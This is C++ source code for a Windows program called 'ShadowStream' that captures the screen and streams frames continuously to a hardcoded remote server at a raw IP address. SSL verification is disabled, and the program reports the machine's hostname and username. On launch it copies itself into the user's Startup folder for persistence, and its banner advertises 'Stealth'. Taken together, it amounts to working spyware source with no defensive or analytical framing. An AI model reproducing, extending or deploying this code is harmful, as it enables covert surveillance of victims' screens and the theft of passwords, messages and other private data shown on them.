#pragma once
#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <string>
#include <random>
#include <sstream>
#include <iomanip>
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>
#include <windows.h>
#include <shlobj.h>  // For SHGetFolderPath
#include <string>
#include <iostream>

#include <gdiplus.h>
#include <gdiplusinit.h>       // GdiplusStartup
#include <objidl.h>            // IStream, CreateStreamOnHGlobal
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "libcurl.lib")
#pragma comment(lib, "crypt32.lib")

using namespace Gdiplus;
using namespace std;
using json = nlohmann::json;

class ShadowStreamClient {
private:
    string serverUrl;
    string username;
    string hostname;
    string clientId;
    string authToken;
    int quality;
    int fps;
    bool isRegistered;
    bool isStreaming;

    // GDI+ encoder CLSID for JPEG
    CLSID jpegClsid;
    ULONG_PTR gdiplusToken;

    string GenerateClientId() {
        random_device rd;
        mt19937 gen(rd());
        uniform_int_distribution<> dis(0, 15);

        stringstream ss;
        for (int i = 0; i < 32; ++i) {
            if (i > 0 && i % 8 == 0) ss << "-";
            ss << hex << dis(gen);
        }
        return ss.str();
    }

    string GetHostname() {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (GetComputerNameA(buffer, &size)) {
            return string(buffer);
        }
        return "Unknown-PC";
    }

    string GetUsername() {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (GetUserNameA(buffer, &size)) {
            return string(buffer);
        }
        return "Unknown-User";
    }

    bool GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
        UINT num = 0;
        UINT size = 0;
        ImageCodecInfo* pImageCodecInfo = nullptr;

        GetImageEncodersSize(&num, &size);
        if (size == 0) return false;

        pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
        if (pImageCodecInfo == nullptr) return false;

        GetImageEncoders(num, size, pImageCodecInfo);

        for (UINT j = 0; j < num; ++j) {
            if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
                *pClsid = pImageCodecInfo[j].Clsid;
                free(pImageCodecInfo);
                return true;
            }
        }

        free(pImageCodecInfo);
        return false;
    }

    vector<BYTE> CaptureScreen() {
        vector<BYTE> imageData;

        try {
            // Get screen dimensions
            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);

            // Create device contexts
            HDC hdcScreen = GetDC(nullptr);
            HDC hdcWindow = CreateCompatibleDC(hdcScreen);

            // Create bitmap
            HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
            HGDIOBJ oldBitmap = SelectObject(hdcWindow, hbmScreen);

            // Copy screen to bitmap
            BitBlt(hdcWindow, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

            // Convert to GDI+ Bitmap
            Bitmap bitmap(hbmScreen, nullptr);

            // Set up encoder parameters for JPEG quality
            EncoderParameters encoderParams;
            encoderParams.Count = 1;
            encoderParams.Parameter[0].Guid = EncoderQuality;
            encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
            encoderParams.Parameter[0].NumberOfValues = 1;
            ULONG qualityValue = quality;
            encoderParams.Parameter[0].Value = &qualityValue;


            // Save to memory stream
            IStream* pStream = nullptr;
            CreateStreamOnHGlobal(nullptr, TRUE, &pStream);

            if (bitmap.Save(pStream, &jpegClsid, &encoderParams) == Ok) {
                // Get data from stream
                HGLOBAL hGlobal;
                GetHGlobalFromStream(pStream, &hGlobal);

                SIZE_T size = GlobalSize(hGlobal);
                LPVOID pData = GlobalLock(hGlobal);

                if (pData && size > 0) {
                    imageData.resize(size);
                    memcpy(imageData.data(), pData, size);
                }

                GlobalUnlock(hGlobal);
            }

            pStream->Release();

            // Cleanup
            SelectObject(hdcWindow, oldBitmap);
            DeleteObject(hbmScreen);
            DeleteDC(hdcWindow);
            ReleaseDC(nullptr, hdcScreen);

        }
        catch (const exception& e) {
            cout << "Screen capture error: " << e.what() << endl;
        }

        return imageData;
    }

public:
    ShadowStreamClient(const string& serverUrl, int q = 75, int f = 10)
        : serverUrl(serverUrl), quality(q), fps(f), isRegistered(false), isStreaming(false) {

        // Initialize GDI+
        GdiplusStartupInput gdiplusStartupInput;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

        // Get JPEG encoder CLSID
        GetEncoderClsid(L"image/jpeg", &jpegClsid);

        // Generate client info
        clientId = GenerateClientId();
        hostname = GetHostname();
        username = GetUsername();

        cout << "ShadowStream Client Initialized" << endl;
        cout << "Client ID: " << clientId << endl;
        cout << "Hostname: " << hostname << endl;
        cout << "Username: " << username << endl;
    }

    ~ShadowStreamClient() {
        if (isStreaming) {
            StopStreaming();
        }
        if (isRegistered) {
            Unregister();
        }
        GdiplusShutdown(gdiplusToken);
    }

    bool Register(const string& accessKey = "") {
        try {
            json payload = {
                {"client_id", clientId},
                {"username", username},
                {"hostname", hostname},
                {"access_key", accessKey},
                {"capabilities", {
                    {"screen_capture", true},
                    {"multiple_monitors", GetSystemMetrics(SM_CMONITORS) > 1}
                }},
                {"system_info", {
                    {"os", "Windows"},
                    {"screen_width", GetSystemMetrics(SM_CXSCREEN)},
                    {"screen_height", GetSystemMetrics(SM_CYSCREEN)}
                }}
            };

            auto response = cpr::Post(
                cpr::Url{ serverUrl + "/api/register" },
                cpr::Body{ payload.dump() },
                cpr::Header{ {"Content-Type", "application/json"} },
                cpr::Timeout{ 10000 },
                cpr::VerifySsl{ false }
            );

            if (response.status_code == 200) {
                auto responseJson = json::parse(response.text);
                if (responseJson["success"]) {
                    authToken = responseJson["token"];
                    isRegistered = true;
                    cout << "✓ Successfully registered with ShadowStream server" << endl;
                    cout << "✓ Auth token received" << endl;
                    return true;
                }
                else {
                    cout << "✗ Registration failed: " << responseJson["message"] << endl;
                }
            }
            else {
                cout << "✗ Registration failed with status: " << response.status_code << endl;
                cout << "Response: " << response.text << endl;
            }
        }
        catch (const exception& e) {
            cout << "✗ Registration error: " << e.what() << endl;
        }

        return false;
    }

    bool StartStreaming() {
        if (!isRegistered) {
            cout << "✗ Cannot start streaming - not registered" << endl;
            return false;
        }

        isStreaming = true;
        cout << "🎥 Starting desktop streaming..." << endl;
        cout << "📊 Quality: " << quality << "%, FPS: " << fps << endl;
        cout << "⚠️  Press Ctrl+C to stop" << endl;

        auto frameInterval = chrono::milliseconds(1000 / fps);
        int frameCount = 0;
        int failCount = 0;

        while (isStreaming) {
            auto startTime = chrono::high_resolution_clock::now();

            // Capture screen
            vector<BYTE> frameData = CaptureScreen();

            if (!frameData.empty()) {
                if (SendFrame(frameData)) {
                    frameCount++;
                    failCount = 0;
                    if (frameCount % 30 == 0) { // Log every 30 frames
                        cout << "📡 Streamed " << frameCount << " frames ("
                            << frameData.size() / 1024 << " KB)" << endl;
                    }
                }
                else {
                    failCount++;
                    cout << "⚠️  Frame send failed (" << failCount << " consecutive failures)" << endl;

                    if (failCount > 10) {
                        cout << "💀 Too many failures, pausing for 5 seconds..." << endl;
                        this_thread::sleep_for(chrono::seconds(5));
                        failCount = 0;
                    }
                }
            }
            else {
                cout << "📹 Screen capture failed" << endl;
            }

            // Maintain FPS
            auto endTime = chrono::high_resolution_clock::now();
            auto elapsed = chrono::duration_cast<chrono::milliseconds>(endTime - startTime);

            if (elapsed < frameInterval) {
                this_thread::sleep_for(frameInterval - elapsed);
            }
        }

        return true;
    }

    bool SendFrame(const vector<BYTE>& frameData) {
        try {
            auto response = cpr::Post(
                cpr::Url{ serverUrl + "/api/stream" },
                cpr::Body{ std::string(frameData.begin(), frameData.end()) },
                cpr::Header{
                    {"Content-Type", "image/jpeg"},
                    {"Authorization", "Bearer " + authToken},
                    {"X-Client-ID", clientId},
                    {"X-Frame-Timestamp", to_string(chrono::duration_cast<chrono::milliseconds>(
                        chrono::system_clock::now().time_since_epoch()).count())}
                },
                cpr::Timeout{ 5000 },
                cpr::VerifySsl{ false }

            );


            return response.status_code == 200;

        }
        catch (const exception& e) {
            return false;
        }
    }

    void StopStreaming() {
        isStreaming = false;
        cout << "🛑 Streaming stopped" << endl;
    }

    bool Unregister() {
        if (!isRegistered) return true;

        try {
            auto response = cpr::Post(
                cpr::Url{ serverUrl + "/api/unregister" },
                cpr::Header{
                    {"Authorization", "Bearer " + authToken},
                    {"X-Client-ID", clientId}
                },
                cpr::Timeout{ 5000 },
                cpr::VerifySsl{ false }
            );

            isRegistered = false;
            cout << "✓ Unregistered from server" << endl;
            return response.status_code == 200;

        }
        catch (const exception& e) {
            cout << "⚠️  Unregister error: " << e.what() << endl;
            return false;
        }
    }

    bool SendHeartbeat() {
        if (!isRegistered) return false;

        try {
            json payload = {
                {"client_id", clientId},
                {"timestamp", chrono::duration_cast<chrono::milliseconds>(
                    chrono::system_clock::now().time_since_epoch()).count()},
                {"status", isStreaming ? "streaming" : "idle"}
            };

            auto response = cpr::Post(
                cpr::Url{ serverUrl + "/api/heartbeat" },
                cpr::Body{ payload.dump() },
                cpr::Header{
                    {"Content-Type", "application/json"},
                    {"Authorization", "Bearer " + authToken}
                },
                cpr::Timeout{ 3000 },
                cpr::VerifySsl{ false }
            );

            return response.status_code == 200;

        }
        catch (const exception& e) {
            return false;
        }
    }
};
bool CopySelfToStartup() {
    char exePath[MAX_PATH];
    // Get full path of the running executable
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
        std::cerr << "GetModuleFileName failed. Error: " << GetLastError() << "\n";
        return false;
    }

    char startupPath[MAX_PATH];
    // Get current user's Startup folder path
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        std::cerr << "Failed to get Startup folder path.\n";
        return false;
    }

    // Extract executable name from full path
    const char* exeName = strrchr(exePath, '\\');
    std::string filename = exeName ? (exeName + 1) : exePath;

    // Build full destination path: Startup folder + executable filename
    std::string destPath = std::string(startupPath) + "\\" + filename;

    // Copy executable to Startup folder (overwrite if exists)
    if (!CopyFileA(exePath, destPath.c_str(), FALSE)) {
        std::cerr << "CopyFile failed. Error: " << GetLastError() << "\n";
        return false;
    }

    std::cout << "Successfully copied to Startup: " << destPath << "\n";
    return true;
}

int main() {
    CopySelfToStartup();
    cout << R"(
  ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
  ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
  ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
  ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ 
  
     ███████╗████████╗██████╗ ███████╗ █████╗ ███╗   ███╗
     ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗████╗ ████║
     ███████╗   ██║   ██████╔╝█████╗  ███████║██╔████╔██║
     ╚════██║   ██║   ██╔══██╗██╔══╝  ██╔══██║██║╚██╔╝██║
     ███████║   ██║   ██║  ██║███████╗██║  ██║██║ ╚═╝ ██║
     ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
                                                          
    🔥 Advanced Remote Desktop Streaming Client v1.0
    ⚡ Stealth • Secure • Multi-Client Support
)" << endl;

    // Configuration
    string serverUrl = "https://199.200.120.20:8000";  // Change to your server
    string accessKey = "shadowstream_2024_secure";                        // Server access key
    int quality = 100;                            // JPEG quality (1-100)  
    int fps = 60;                                // Frames per second

    cout << "🔧 Configuration:" << endl;
    cout << "   Server: " << serverUrl << endl;
    cout << "   Quality: " << quality << "%" << endl;
    cout << "   FPS: " << fps << endl;
    cout << endl;

    // Create client
    ShadowStreamClient client(serverUrl, quality, fps);

    // Register with server
    cout << "🔐 Registering with ShadowStream server..." << endl;
    if (!client.Register(accessKey)) {
        cout << "💀 Failed to register. Check server connection and access key." << endl;
        cout << "Press any key to exit..." << endl;
        cin.get();
        return 1;
    }

    // Start heartbeat thread
    bool keepHeartbeat = true;
    thread heartbeatThread([&client, &keepHeartbeat]() {
        while (keepHeartbeat) {
            this_thread::sleep_for(chrono::seconds(30));
            if (keepHeartbeat) {
                client.SendHeartbeat();
            }
        }
        });

    // Start streaming
    cout << "🚀 Starting stream..." << endl;
    client.StartStreaming();

    // Cleanup
    keepHeartbeat = false;
    if (heartbeatThread.joinable()) {
        heartbeatThread.join();
    }

    cout << "👋 ShadowStream client terminated." << endl;
    return 0;
}